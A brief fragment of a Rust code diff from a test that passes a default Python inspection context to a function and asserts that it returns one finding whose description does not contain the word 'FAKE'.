+            PythonInspectContext::default(),
+            &mut findings,
+        );
         assert_eq!(findings.len(), 1);
         assert!(
             !findings[0].description.contains("FAKE")
